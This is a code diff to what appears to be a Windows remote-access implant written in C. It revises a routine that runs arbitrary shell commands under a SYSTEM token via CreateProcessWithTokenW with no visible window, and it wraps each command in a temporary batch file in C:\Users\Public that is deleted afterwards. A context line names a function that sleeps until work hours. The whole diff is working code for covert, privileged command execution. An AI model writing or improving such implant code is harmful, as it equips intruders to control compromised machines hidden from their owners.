@@ -76,13 +76,22 @@ void sleep_until_work_hours(void) {
 
 // ── Shell execution ───────────────────────────────────────────────────────────
 
+static void shell_cleanup_files(const char *out_file, const char *script_file,
+                                const char *script_tmp) {
+    if (out_file && out_file[0]) DeleteFileA(out_file);
+    if (script_file && script_file[0]) DeleteFileA(script_file);
+    if (script_tmp && script_tmp[0]) DeleteFileA(script_tmp);
+}
+
 /* Last-resort capture path for systems where the token process was created
- * but its standard handles were not connected.  The normal fallback now
- * retries CreateProcessWithTokenW with the anonymous pipe directly; this
- * file path remains only as a diagnostic/compatibility fallback. */
+ * but its standard handles were not connected.  Put the command in a real
+ * .cmd file and launch that file as SYSTEM.  This avoids relying on /c's
+ * quote/redirection grammar and avoids inheriting any local-user handles. */
 static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
                                        DWORD as_user_err) {
     char out_file[MAX_PATH] = {0};
+    char script_tmp[MAX_PATH] = {0};
+    char script_file[MAX_PATH] = {0};
     if (!GetTempFileNameA("C:\\Users\\Public", "egx", 0, out_file)) {
         char *e = (char*)malloc(128);
         if (as_user_err) {
@@ -94,16 +103,50 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
         return e;
     }
 
-    /* Keep the redirection outside the command string passed to /c.  With
-     * `/s /c "(...) > ..."`, cmd.exe applies its special quote-stripping
-     * rules before parsing the parentheses/redirection; on some builds that
-     * leaves a successful, but empty, command.  `/d /c` has unambiguous
-     * parsing here and the output path is quoted independently. */
+    if (!GetTempFileNameA("C:\\Users\\Public", "egs", 0, script_tmp)) {
+        DWORD err = GetLastError();
+        shell_cleanup_files(out_file, script_file, script_tmp);
+        char *e = (char*)malloc(128);
+        snprintf(e, 128, "[error: shell script temp file %lu]", err);
+        return e;
+    }
+    int script_path_len = snprintf(script_file, sizeof(script_file),
+                                   "%s.cmd", script_tmp);
+    if (script_path_len < 0 || (size_t)script_path_len >= sizeof(script_file)) {
+        shell_cleanup_files(out_file, script_file, script_tmp);
+        return strdup("[error: shell script path too long]");
+    }
+    /* GetTempFileName creates script_tmp; rename it to a .cmd extension so
+       cmd.exe executes it as a batch script rather than treating it as data. */
+    DeleteFileA(script_file);
+    if (!MoveFileA(script_tmp, script_file)) {
+        DWORD err = GetLastError();
+        shell_cleanup_files(out_file, script_file, script_tmp);
+        char *e = (char*)malloc(128);
+        snprintf(e, 128, "[error: shell script rename %lu]", err);
+        return e;
+    }
+    script_tmp[0] = '\0';
+
+    FILE *sf = fopen(script_file, "wb");
+    if (!sf) {
+        shell_cleanup_files(out_file, script_file, script_tmp);
+        return strdup("[error: shell script create]");
+    }
+    int script_len = fprintf(sf,
+        "@echo off\r\n(\r\n%s\r\n) > \"%s\" 2>&1\r\n", cmd, out_file);
+    int script_bad = (script_len < 0 || ferror(sf));
+    fclose(sf);
+    if (script_bad) {
+        shell_cleanup_files(out_file, script_file, script_tmp);
+        return strdup("[error: shell script write]");
+    }
+
     char file_cmd[4608];
     int cmd_len = snprintf(file_cmd, sizeof(file_cmd),
-        "cmd.exe /d /c %s > \"%s\" 2>&1", cmd, out_file);
+        "cmd.exe /d /c call \"%s\"", script_file);
     if (cmd_len < 0 || (size_t)cmd_len >= sizeof(file_cmd)) {
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         return strdup("[error: shell command too long]");
     }
 
@@ -111,14 +154,14 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
     if (MultiByteToWideChar(CP_ACP, 0, file_cmd, -1, wcmd,
                             (int)(sizeof(wcmd) / sizeof(wcmd[0]))) <= 0) {
         DWORD err = GetLastError();
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         char *e = (char*)malloc(128);
         snprintf(e, 128, "[error: shell command encoding %lu]", err);
         return e;
     }
 
     if (!CreateProcessWithTokenW) {
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         return strdup("[error: CreateProcessWithTokenW unavailable]");
     }
 
@@ -140,7 +183,7 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
         RevertToSelf();
     }
     if (!imp_ok) {
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         char *e = (char*)malloc(128);
         snprintf(e, 128,
                  "[error: CreateProcessAsUserW %lu; ImpersonateLoggedOnUser %lu]",
@@ -148,7 +191,7 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
         return e;
     }
     if (!proc_ok) {
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         char *e = (char*)malloc(128);
         if (as_user_err) {
             snprintf(e, 128,
@@ -168,7 +211,7 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
         DWORD wait_err = GetLastError();
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         char *e = (char*)malloc(128);
         snprintf(e, 128, "[error: shell capture wait %lu]", wait_err);
         return e;
@@ -178,14 +221,14 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
 
     FILE *f = fopen(out_file, "rb");
     if (!f) {
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         return strdup("[error: shell capture file unavailable]");
     }
     size_t cap = 4096, len = 0;
     char *buf = (char*)malloc(cap);
     if (!buf) {
         fclose(f);
-        DeleteFileA(out_file);
+        shell_cleanup_files(out_file, script_file, script_tmp);
         return strdup("[oom]");
     }
     DWORD nr = 0;
@@ -197,7 +240,7 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
             if (!nb) {
                 free(buf);
                 fclose(f);
-                DeleteFileA(out_file);
+                shell_cleanup_files(out_file, script_file, script_tmp);
                 return strdup("[oom]");
             }
             buf = nb;
@@ -206,18 +249,18 @@ static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
         len += nr;
     }
     fclose(f);
-    DeleteFileA(out_file);
+    shell_cleanup_files(out_file, script_file, script_tmp);
     buf[len] = '\0';
     if (len == 0) {
         free(buf);
         if (as_user_err) {
             char *e = (char*)malloc(160);
             snprintf(e, 160,
-                     "[error: CreateProcessAsUserW %lu; SYSTEM shell capture empty]",
+                     "[error: CreateProcessAsUserW %lu; SYSTEM shell wrapper output empty]",
                      as_user_err);
             return e;
         }
-        return strdup("[error: SYSTEM shell capture empty]");
+        return strdup("[error: SYSTEM shell wrapper output empty]");
     }
     return buf;
 }
@@ -261,6 +304,10 @@ static char* run_shell(const char *cmd) {
             snprintf(e, 96, "[error: command encoding %lu]", err);
             return e;
         }
+        /* CreateProcess* may insert a terminator into lpCommandLine. Keep a
+           pristine copy for the CreateProcessWithTokenW retry. */
+        wchar_t wcmd_token[4096];
+        memcpy(wcmd_token, wcmd, sizeof(wcmd_token));
 
         STARTUPINFOW si = {0};
         si.cb        = sizeof(si);
@@ -291,7 +338,7 @@ static char* run_shell(const char *cmd) {
                avoids the lossy cmd.exe-to-temp-file redirection fallback. */
             if (!proc_ok && CreateProcessWithTokenW) {
                 static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
-                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wcmd,
+                proc_ok = CreateProcessWithTokenW(hSysTok, 0, cmd_app, wcmd_token,
                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                 proc_err = GetLastError();
                 if (proc_ok) proc_err = 0;
